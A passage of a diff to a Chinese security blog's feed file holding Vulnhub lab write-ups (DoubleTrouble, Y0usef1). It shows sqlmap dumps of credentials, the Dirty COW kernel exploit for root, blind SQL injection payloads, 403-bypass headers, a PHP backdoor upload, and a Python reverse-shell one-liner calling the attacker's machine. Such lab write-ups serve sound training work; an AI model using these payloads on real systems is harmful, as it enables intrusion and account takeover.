+<p>因此，漏洞只可能出现在登录界面，但是不论输入什么都没有任何反应。使用sqlmap，可以发现漏洞，因此直接用sqlmap扫： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -r r.txt -p uname --dbs -&gt; doubletrouble, information_schema</span><br><span class="line">sqlmap -r r.txt -p uname -D doubletrouble --tables -&gt; users</span><br><span class="line">sqlmap -r r.txt -p uname -D doubletrouble -T users --columns -&gt; username, password</span><br><span class="line">sqlmap -r r.txt -p uname -D doubletrouble -T users -C username,password --dump</span><br></pre></td></tr></table></figure></p>
+<p>最终得到如下信息：</p>
+<table>
+<thead>
+<tr class="header">
+<th style="text-align: center;">username</th>
+<th style="text-align: center;">password</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td style="text-align: center;">montreux</td>
+<td style="text-align: center;">GfsZxc1</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">clapton</td>
+<td style="text-align: center;">ZubZub99</td>
+</tr>
+</tbody>
+</table>
+<p>然后去登陆界面登录，发现两个都登录不上。首先这不太可能是错误的消息，那么只有一种可能，那就是并不是登录界面的用户名和密码。在端口扫描中发现了22端口有着ssh服务，因此尝试连接，发现第二个用户和密码可以连接的上。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418101134.png" /></p>
+<h2 id="权限提升-1">3.3 权限提升</h2>
+<p>首先查看了sudo配置，发现该靶机都没有sudo命令。suid权限也没有获得有用的信息。但是查看内核时发现，该靶机的Linux内核比较的老</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418101313.png" /></p>
+<p>因此，可能存在内核漏洞，这里介绍脏牛漏洞<a href="https://github.com/FireFart/dirtycow">dirty</a></p>
+<blockquote>
+<p>该漏洞利用dirtycow漏洞的pokemon漏洞利用作为基础，自动生成新的passwd行。运行二进制文件时，将提示用户输入新密码。然后将原始 /etc/passwd 文件备份到 /tmp/passwd.bak 并用生成的行覆盖 root 帐户。运行漏洞利用后，您应该能够使用新创建的用户登录。</p>
+</blockquote>
+<p>将exp放到靶机上，然后编译执行即可，注意要进入可读可写的目录，比如<code>/tmp</code>。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class="line">./dirty</span><br></pre></td></tr></table></figure></p>
+<p>然后需要输入新的密码。该漏洞会创建一个名为<code>firefart</code>的用户，但是拥有root权限</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418101933.png" /></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418102252.png" /></p>
+<hr />
+<p>脏牛提权后，利用下述命令恢复原来的<code>/etc/passwd</code>： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mv /tmp/passwd.bak /etc/passwd</span><br></pre></td></tr></table></figure></p>
+<hr />
+<p>接下来查看两个flag，第一个在<code>/root/root.txt</code>，第二个在<code>/home/clapton/user.txt</code> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// root.txt</span><br><span class="line">1B8EEA89EA92CECB931E3CC25AA8DE21</span><br><span class="line"></span><br><span class="line">// user.txt</span><br><span class="line">6CEA7A737C7C651F6DA7669109B5FB52</span><br></pre></td></tr></table></figure></p>
+<p>靶机到此结束！</p>
+<h1 id="总结">4 总结</h1>
+<p>该靶机的难度确实不算难，不过还是存在着几个难点：</p>
+<ul>
+<li>第一台靶机的隐写术密码爆破</li>
+<li>第二台靶机的时间盲注的<strong>发现</strong></li>
+</ul>
+<p>我感觉第二台靶机只是做了一个登录界面，将我们输入的内容带入MySQL进行查询，不论结果对错，也不论是否有语法错误，都没有任何提示。现实情况下总会有不同的提示的，所以这里是一个难点。</p>
+<h2 id="sql注入时间盲注">4.1 SQL注入——时间盲注</h2>
+<p>如果后台语句为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where username=&#x27;.$_POST[&quot;uname&quot;].&#x27; and password=&#x27;.$_POST[&quot;psw&quot;].&#x27;;</span><br></pre></td></tr></table></figure></p>
+<p>那么只需要<code>uname=1'and sleep(5)#&amp;psw=1</code>即可，此时： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where username=&#x27;1&#x27;and sleep(5)#&#x27; and password=&#x27;1&#x27;;</span><br></pre></td></tr></table></figure></p>
+<p>但是该靶机不行，此时小技巧： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=1&#x27; and(select x from (select (sleep(3)))alia)#</span><br></pre></td></tr></table></figure></p>
+<p>解释：</p>
+<p>此时，不论后台语句如何，至少存在 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=1&#x27; and(select x from(select (sleep(5)))alia)#</span><br></pre></td></tr></table></figure></p>
+<p>那么先查询<code>select (sleep(3))</code>，直接触发，然后将返回的结果起个别名<code>alia</code>，最后执行<code>select x from alia</code>，因为<code>alia</code>中必定不存在<code>x</code>，所以没有返回结果，因此最终呈现的效果就是页面返回的时间被延迟了。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418104149.png" /></p>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>综合</tag>
+        <tag>vulnhub</tag>
+        <tag>隐写术</tag>
+        <tag>开源CMS漏洞利用</tag>
+        <tag>GTFObins提权</tag>
+        <tag>SQL注入</tag>
+        <tag>脏牛提权</tag>
       </tags>
   </entry>
   <entry>
@@ -2019,132 +2019,6 @@
       </tags>
   </entry>
   <entry>
-    <title>8 Vulnhub Y0usef1 Writeup</title>
-    <url>/2022/04/09/8%20Vulnhub%20Y0usef1%20Writeup/</url>
-    <content><![CDATA[<p>该靶机难度为简单。</p>
-<span id="more"></span>
-<h1 id="靶机信息">靶机信息</h1>
-<p>靶机地址：<a href="https://www.vulnhub.com/entry/y0usef-1,624/">y0usef</a></p>
-<p>难度：Easy（难度低说明日常中最常见的漏洞）</p>
-<p>目标：取得root权限 + 2Flag</p>
-<p>涉及攻击方法：</p>
-<ul>
-<li>主机发现</li>
-<li>端口扫描</li>
-<li>Web信息收集</li>
-<li>弱口令</li>
-<li><strong>指纹探测</strong></li>
-<li><strong>403 Bypass</strong></li>
-<li>文件上传</li>
-<li>提权</li>
-</ul>
-<h1 id="linux-sudo命令">Linux sudo命令</h1>
-<p>Linux sudo命令以系统管理者的身份执行指令，也就是说，经由 sudo 所执行的指令就好像是 root 亲自执行。</p>
-<p>使用权限：在 /etc/sudoers 中有出现的使用者。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. sudo -V # 显示版本编号</span><br><span class="line">2. sudo -h # 显示版本编号及指令的使用方式说明 help</span><br><span class="line">3. sudo -l # 显示出自己（执行 sudo 的使用者）的权限</span><br><span class="line">4. sudo -v # 因为 sudo 在第一次执行时或是在 N 分钟内没有执行（N 预设为五）会问密码，这个参数是重新做一次确认，如果超过 N 分钟，也会问密码</span><br><span class="line">5. sudo -k # 将会强迫使用者在下一次执行 sudo 时问密码（不论有没有超过 N 分钟）</span><br><span class="line">6. sudo -s # 执行环境变量中的 SHELL 所指定的 shell ，或是 /etc/passwd 里所指定的 shell</span><br><span class="line">7. sudo -H # 将环境变量中的 HOME （家目录）指定为要变更身份的使用者家目录（如不加 -u 参数就是系统管理者 root ）</span><br><span class="line">8. sudo command # 要以系统管理者身份（或以 -u 更改为其他人）执行的指令</span><br><span class="line">9. sudo [ -b ] [ -p prompt ] [ -u username/#uid] -s</span><br><span class="line">	-b 将要执行的指令</span><br><span class="line">	-p prompt 可以更改问密码的提示语，其中 %u 会代换为使用者的帐号名称， %h 会显示主机名称</span><br><span class="line">	-u username/#uid 不加此参数，代表要以 root 的身份执行指令，而加了此参数，可以以 username 的身份执行指令（#uid 为该 username 的使用者id）</span><br></pre></td></tr></table></figure>
-<h1 id="bypass">403&amp;401 Bypass</h1>
-<p>常见403 Bypass：</p>
-<ol type="1">
-<li>旁站绕过：修改请求包中的host（可以是域名，也可以是IP地址）。假设目标网站的域名为<code>www.target.com</code>，我们通过信息收集发现存在另一个子域名<code>special.target.com</code>，我们从<code>www</code>访问某个文件可能出现403，但是从<code>special</code>访问可能就能够成功。这是因为管理员<strong>只针对<code>www.target.com</code>的请求做了限制</strong>。</li>
-<li>覆盖URL</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原先的数据包：</span><br><span class="line"># Request</span><br><span class="line">  GET /auth/login HTTP/1.1</span><br><span class="line"># Response</span><br><span class="line">  HTTP/1.1 403 Forbidden</span><br><span class="line"></span><br><span class="line">覆盖URL的数据包：</span><br><span class="line"># Reques</span><br><span class="line">  GET / HTTP/1.1</span><br><span class="line">  X-Original-URL: /auth/login</span><br><span class="line"># Response</span><br><span class="line">  HTTP/1.1 200 OK</span><br></pre></td></tr></table></figure>
-<p>原理：管理员<strong>只针对请求的URL做了限制</strong>，即如果直接访问<code>/auth/login</code>则会403，但是，如果访问根目录，然后通过X-Original-URL 或 X-Rewrite-URL HTTP 请求标头覆盖请求 URL 中的路径（前提是服务器支持这两种标头）</p>
-<ol start="3" type="1">
-<li>修改来源</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原先的数据包：</span><br><span class="line"># Request</span><br><span class="line">  GET /auth/login HTTP/1.1</span><br><span class="line"># Response</span><br><span class="line">  HTTP/1.1 403 Forbidden</span><br><span class="line"></span><br><span class="line">修改来源的数据包：</span><br><span class="line"># Reques</span><br><span class="line">  GET /auth/login HTTP/1.1</span><br><span class="line">  Referer: https://xxx.com</span><br><span class="line"># Response</span><br><span class="line">  HTTP/1.1 200 OK</span><br></pre></td></tr></table></figure>
-<p>原理：管理员<strong>只针对从其他域名/网站来的请求做了限制</strong>，因此，通过修改<code>Referer</code>将请求的来源伪装成已经授权的URL地址。此时，服务端会认为该用户已经得到了授权，所以允许访问其他需要授权的URL</p>
-<ol start="4" type="1">
-<li>反向代理：使用许多<code>X</code>开头的头部，比如<code>X-Forwarded-For</code>。</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Originating-IP: 127.0.0.1</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">X-Forwarded: 127.0.0.1</span><br><span class="line">Forwarded-For: 127.0.0.1</span><br><span class="line">X-Remote-IP: 127.0.0.1</span><br><span class="line">X-Remote-Addr: 127.0.0.1</span><br><span class="line">X-ProxyUser-Ip: 127.0.0.1</span><br><span class="line">X-Original-URL: 127.0.0.1</span><br><span class="line">Client-IP: 127.0.0.1</span><br><span class="line">True-Client-IP: 127.0.0.1</span><br><span class="line">Cluster-Client-IP: 127.0.0.1</span><br><span class="line">X-ProxyUser-Ip: 127.0.0.1</span><br></pre></td></tr></table></figure>
-<h1 id="渗透">渗透</h1>
-<h2 id="主机发现端口扫描端口服务发现">主机发现、端口扫描、端口服务发现</h2>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.11</span><br><span class="line">sudo nmap -p20,80 -sV 10.0.2.11</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409143240.png" /></p>
-<ul>
-<li>22端口开启ssh服务</li>
-<li>80端口开着http服务，Apache版本2.4.10</li>
-<li>靶机的操作系统为Ubuntu</li>
-</ul>
-<h2 id="访问http服务">访问HTTP服务</h2>
-<p>访问80端口，得到提示： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sorry, the site is under construction soon, it run</span><br></pre></td></tr></table></figure></p>
-<p>查看源码发现没有什么有用的信息，那就进行路径发现。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u 10.0.2.11:80</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409143714.png" /></p>
-<p>先访问了状态码为200的两个文件，发现没什么变化，再去看了一下301的文件</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409143948.png" /></p>
-<p>发现居然返回403。403表示服务器有这个资源，但是对访问该资源的用户做了一定的限制，只有经过授权的用户才能够访问，否则就会返回403。因此，这里想到403 Bypass。</p>
-<h2 id="指纹探测">指纹探测</h2>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">whatweb http://10.0.2.11</span><br></pre></td></tr></table></figure>
-<p>像上面收集不到任何信息的时候，可以采用指纹探测，看一下网站的结构（用的什么框架，版本多少，语言是什么之类的信息），如果对应的框架存在漏洞，就可以直接利用！</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409150017.png" /></p>
-<h2 id="bypass-1">403 Bypass</h2>
-<p>经过尝试，发现在请求头部添加下面信息时，成功访问 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409144347.png" /></p>
-<p>注意，如果后面渗透过程中再次出现403，那么就在请求数据包中加入上述信息即可，也可以每个都加（反正没害）。</p>
-<h2 id="弱口令">弱口令</h2>
-<p>拿到输入框一般有以下思路：</p>
-<ol type="1">
-<li>弱口令</li>
-<li>注入漏洞</li>
-<li>XXE、XXS</li>
-<li>爆破</li>
-</ol>
-<p>这里随便尝试了下弱口令，居然登录成功！ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password: admin</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409144729.png" /></p>
-<h2 id="文件上传">文件上传</h2>
-<p>一进来就看到了<code>Upload file</code></p>
-<p>直接上传一个后门php文件，发现上传不成功，也就是被拦截了。现在需要绕过拦截，常规有以下方法：</p>
-<ol type="1">
-<li>修改后缀（大小写、复写）</li>
-<li>修改<code>Content-Type</code></li>
-<li>修改文件头部信息</li>
-</ol>
-<p>经过测试，发现本题后台的验证方式是<code>Content-Type</code>，因此将该信息修改为图片的即可上传成功，并且成功获得路径！</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409145138.png" /></p>
-<p>命令成功被执行，确定文件上传成功！</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409145414.png" /></p>
-<p>接下来就是反弹shell了。这里可以采用nc，也可以用python，我这里打算用python，所以先用<code>which python</code>查看以下靶机上是否存在python环境，发现确实存在，那么直接执行python反弹shell的代码即可。（先在kali上进行端口监听）</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.2.4&quot;,3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409145751.png" /></p>
-<h2 id="权限提升">权限提升</h2>
-<p>该靶机的权限提升是最简单的。</p>
-<p>首先进行信息收集，发现在家目录下有一个文件<code>user.txt</code>，一看就知道是flag；以及一个目录<code>yousef</code>。查看<code>/etc/passwd</code>发现确实有这么一个用户。</p>
-<p>我们先尝试读取<code>user.txt</code>的信息，发现能够直接读取！ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c3NoIDogCnVzZXIgOiB5b3VzZWYgCnBhc3MgOiB5b3VzZWYxMjM=</span><br></pre></td></tr></table></figure></p>
-<p>这看过去有点像base64编码的结果。因此尝试解码。</p>
-<blockquote>
-<p>base64编码得到的字符串包含a-zA-Z0-9/+=，最显著的特征就是结果有一个或多个=。</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409150426.png" /></p>
-<p>发现居然直接就得到<code>yousef</code>得账号和密码！直接<code>su</code>切换（需要进行shell升级），当然也可以选择用<code>ssh</code>连接</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409150759.png" /></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409150809.png" /></p>
-<p>查看以下该用户得sudo权限 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409150849.png" /></p>
-<p>发现该用户居然有全部得权限。因此直接用sudo权限执行shell即可。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -s</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409151011.png" /></p>
-<p>提权成功！直接读取<code>/root</code>下的flag即可 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bat /root/root.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># WW91J3ZlIGdvdCB0aGUgcm9vdCBDb25ncmF0dWxhdGlvbnMgYW55IGZlZWRiYWNrIGNvbnRlbnQgbWUgdHdpdHRlciBAeTB1c2VmXzEx</span></span><br></pre></td></tr></table></figure></p>
-<p>该靶机到此结束。</p>
-<h1 id="总结">总结</h1>
-<p>该靶机虽然难度为简单，这是因为该靶机的漏洞在现实中比较常见，大家见的多了，自然就简单了。换句话说，简单的靶机更贴近现实。</p>
-<p>通过对该靶机的渗透，还是学到了一些知识：</p>
-<ol type="1">
-<li>指纹探测</li>
-<li>403 Bypass</li>
-</ol>
-]]></content>
-      <categories>
-        <category>内网渗透</category>
-      </categories>
-      <tags>
-        <tag>综合</tag>
-        <tag>vulnhub</tag>
-        <tag>指纹探测</tag>
-        <tag>403 Bypass</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>7 Vulnhub HackerKid1.0.1 Writeup</title>
     <url>/2022/04/08/7%20Vulnhub%20HackerKid1.0.1%20Writeup/</url>
     <content><![CDATA[<p>该靶机难度介于简单和中等之间，具有OSCP风格，不建议爆破，每一步都会有适当的提示。渗透所用到的攻击方式比较新（较前几个靶机来说）。</p>
@@ -2304,6 +2178,132 @@
       </tags>
   </entry>
   <entry>
+    <title>8 Vulnhub Y0usef1 Writeup</title>
+    <url>/2022/04/09/8%20Vulnhub%20Y0usef1%20Writeup/</url>
+    <content><![CDATA[<p>该靶机难度为简单。</p>
+<span id="more"></span>
+<h1 id="靶机信息">靶机信息</h1>
+<p>靶机地址：<a href="https://www.vulnhub.com/entry/y0usef-1,624/">y0usef</a></p>
+<p>难度：Easy（难度低说明日常中最常见的漏洞）</p>
+<p>目标：取得root权限 + 2Flag</p>
+<p>涉及攻击方法：</p>
+<ul>
+<li>主机发现</li>
+<li>端口扫描</li>
+<li>Web信息收集</li>
+<li>弱口令</li>
+<li><strong>指纹探测</strong></li>
+<li><strong>403 Bypass</strong></li>
+<li>文件上传</li>
+<li>提权</li>
+</ul>
+<h1 id="linux-sudo命令">Linux sudo命令</h1>
+<p>Linux sudo命令以系统管理者的身份执行指令，也就是说，经由 sudo 所执行的指令就好像是 root 亲自执行。</p>
+<p>使用权限：在 /etc/sudoers 中有出现的使用者。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. sudo -V # 显示版本编号</span><br><span class="line">2. sudo -h # 显示版本编号及指令的使用方式说明 help</span><br><span class="line">3. sudo -l # 显示出自己（执行 sudo 的使用者）的权限</span><br><span class="line">4. sudo -v # 因为 sudo 在第一次执行时或是在 N 分钟内没有执行（N 预设为五）会问密码，这个参数是重新做一次确认，如果超过 N 分钟，也会问密码</span><br><span class="line">5. sudo -k # 将会强迫使用者在下一次执行 sudo 时问密码（不论有没有超过 N 分钟）</span><br><span class="line">6. sudo -s # 执行环境变量中的 SHELL 所指定的 shell ，或是 /etc/passwd 里所指定的 shell</span><br><span class="line">7. sudo -H # 将环境变量中的 HOME （家目录）指定为要变更身份的使用者家目录（如不加 -u 参数就是系统管理者 root ）</span><br><span class="line">8. sudo command # 要以系统管理者身份（或以 -u 更改为其他人）执行的指令</span><br><span class="line">9. sudo [ -b ] [ -p prompt ] [ -u username/#uid] -s</span><br><span class="line">	-b 将要执行的指令</span><br><span class="line">	-p prompt 可以更改问密码的提示语，其中 %u 会代换为使用者的帐号名称， %h 会显示主机名称</span><br><span class="line">	-u username/#uid 不加此参数，代表要以 root 的身份执行指令，而加了此参数，可以以 username 的身份执行指令（#uid 为该 username 的使用者id）</span><br></pre></td></tr></table></figure>
+<h1 id="bypass">403&amp;401 Bypass</h1>
+<p>常见403 Bypass：</p>
+<ol type="1">
+<li>旁站绕过：修改请求包中的host（可以是域名，也可以是IP地址）。假设目标网站的域名为<code>www.target.com</code>，我们通过信息收集发现存在另一个子域名<code>special.target.com</code>，我们从<code>www</code>访问某个文件可能出现403，但是从<code>special</code>访问可能就能够成功。这是因为管理员<strong>只针对<code>www.target.com</code>的请求做了限制</strong>。</li>
+<li>覆盖URL</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原先的数据包：</span><br><span class="line"># Request</span><br><span class="line">  GET /auth/login HTTP/1.1</span><br><span class="line"># Response</span><br><span class="line">  HTTP/1.1 403 Forbidden</span><br><span class="line"></span><br><span class="line">覆盖URL的数据包：</span><br><span class="line"># Reques</span><br><span class="line">  GET / HTTP/1.1</span><br><span class="line">  X-Original-URL: /auth/login</span><br><span class="line"># Response</span><br><span class="line">  HTTP/1.1 200 OK</span><br></pre></td></tr></table></figure>
+<p>原理：管理员<strong>只针对请求的URL做了限制</strong>，即如果直接访问<code>/auth/login</code>则会403，但是，如果访问根目录，然后通过X-Original-URL 或 X-Rewrite-URL HTTP 请求标头覆盖请求 URL 中的路径（前提是服务器支持这两种标头）</p>
+<ol start="3" type="1">
+<li>修改来源</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原先的数据包：</span><br><span class="line"># Request</span><br><span class="line">  GET /auth/login HTTP/1.1</span><br><span class="line"># Response</span><br><span class="line">  HTTP/1.1 403 Forbidden</span><br><span class="line"></span><br><span class="line">修改来源的数据包：</span><br><span class="line"># Reques</span><br><span class="line">  GET /auth/login HTTP/1.1</span><br><span class="line">  Referer: https://xxx.com</span><br><span class="line"># Response</span><br><span class="line">  HTTP/1.1 200 OK</span><br></pre></td></tr></table></figure>
+<p>原理：管理员<strong>只针对从其他域名/网站来的请求做了限制</strong>，因此，通过修改<code>Referer</code>将请求的来源伪装成已经授权的URL地址。此时，服务端会认为该用户已经得到了授权，所以允许访问其他需要授权的URL</p>
+<ol start="4" type="1">
+<li>反向代理：使用许多<code>X</code>开头的头部，比如<code>X-Forwarded-For</code>。</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Originating-IP: 127.0.0.1</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">X-Forwarded: 127.0.0.1</span><br><span class="line">Forwarded-For: 127.0.0.1</span><br><span class="line">X-Remote-IP: 127.0.0.1</span><br><span class="line">X-Remote-Addr: 127.0.0.1</span><br><span class="line">X-ProxyUser-Ip: 127.0.0.1</span><br><span class="line">X-Original-URL: 127.0.0.1</span><br><span class="line">Client-IP: 127.0.0.1</span><br><span class="line">True-Client-IP: 127.0.0.1</span><br><span class="line">Cluster-Client-IP: 127.0.0.1</span><br><span class="line">X-ProxyUser-Ip: 127.0.0.1</span><br></pre></td></tr></table></figure>
+<h1 id="渗透">渗透</h1>
+<h2 id="主机发现端口扫描端口服务发现">主机发现、端口扫描、端口服务发现</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.11</span><br><span class="line">sudo nmap -p20,80 -sV 10.0.2.11</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409143240.png" /></p>
+<ul>
+<li>22端口开启ssh服务</li>
+<li>80端口开着http服务，Apache版本2.4.10</li>
+<li>靶机的操作系统为Ubuntu</li>
+</ul>
+<h2 id="访问http服务">访问HTTP服务</h2>
+<p>访问80端口，得到提示： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sorry, the site is under construction soon, it run</span><br></pre></td></tr></table></figure></p>
+<p>查看源码发现没有什么有用的信息，那就进行路径发现。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u 10.0.2.11:80</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409143714.png" /></p>
+<p>先访问了状态码为200的两个文件，发现没什么变化，再去看了一下301的文件</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409143948.png" /></p>
+<p>发现居然返回403。403表示服务器有这个资源，但是对访问该资源的用户做了一定的限制，只有经过授权的用户才能够访问，否则就会返回403。因此，这里想到403 Bypass。</p>
+<h2 id="指纹探测">指纹探测</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">whatweb http://10.0.2.11</span><br></pre></td></tr></table></figure>
+<p>像上面收集不到任何信息的时候，可以采用指纹探测，看一下网站的结构（用的什么框架，版本多少，语言是什么之类的信息），如果对应的框架存在漏洞，就可以直接利用！</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409150017.png" /></p>
+<h2 id="bypass-1">403 Bypass</h2>
+<p>经过尝试，发现在请求头部添加下面信息时，成功访问 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409144347.png" /></p>
+<p>注意，如果后面渗透过程中再次出现403，那么就在请求数据包中加入上述信息即可，也可以每个都加（反正没害）。</p>
+<h2 id="弱口令">弱口令</h2>
+<p>拿到输入框一般有以下思路：</p>
+<ol type="1">
+<li>弱口令</li>
+<li>注入漏洞</li>
+<li>XXE、XXS</li>
+<li>爆破</li>
+</ol>
+<p>这里随便尝试了下弱口令，居然登录成功！ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password: admin</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409144729.png" /></p>
+<h2 id="文件上传">文件上传</h2>
+<p>一进来就看到了<code>Upload file</code></p>
+<p>直接上传一个后门php文件，发现上传不成功，也就是被拦截了。现在需要绕过拦截，常规有以下方法：</p>
+<ol type="1">
+<li>修改后缀（大小写、复写）</li>
+<li>修改<code>Content-Type</code></li>
+<li>修改文件头部信息</li>
+</ol>
+<p>经过测试，发现本题后台的验证方式是<code>Content-Type</code>，因此将该信息修改为图片的即可上传成功，并且成功获得路径！</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409145138.png" /></p>
+<p>命令成功被执行，确定文件上传成功！</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409145414.png" /></p>
+<p>接下来就是反弹shell了。这里可以采用nc，也可以用python，我这里打算用python，所以先用<code>which python</code>查看以下靶机上是否存在python环境，发现确实存在，那么直接执行python反弹shell的代码即可。（先在kali上进行端口监听）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.2.4&quot;,3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409145751.png" /></p>
+<h2 id="权限提升">权限提升</h2>
+<p>该靶机的权限提升是最简单的。</p>
+<p>首先进行信息收集，发现在家目录下有一个文件<code>user.txt</code>，一看就知道是flag；以及一个目录<code>yousef</code>。查看<code>/etc/passwd</code>发现确实有这么一个用户。</p>
+<p>我们先尝试读取<code>user.txt</code>的信息，发现能够直接读取！ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c3NoIDogCnVzZXIgOiB5b3VzZWYgCnBhc3MgOiB5b3VzZWYxMjM=</span><br></pre></td></tr></table></figure></p>
+<p>这看过去有点像base64编码的结果。因此尝试解码。</p>
+<blockquote>
+<p>base64编码得到的字符串包含a-zA-Z0-9/+=，最显著的特征就是结果有一个或多个=。</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409150426.png" /></p>
+<p>发现居然直接就得到<code>yousef</code>得账号和密码！直接<code>su</code>切换（需要进行shell升级），当然也可以选择用<code>ssh</code>连接</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409150759.png" /></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409150809.png" /></p>
+<p>查看以下该用户得sudo权限 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409150849.png" /></p>
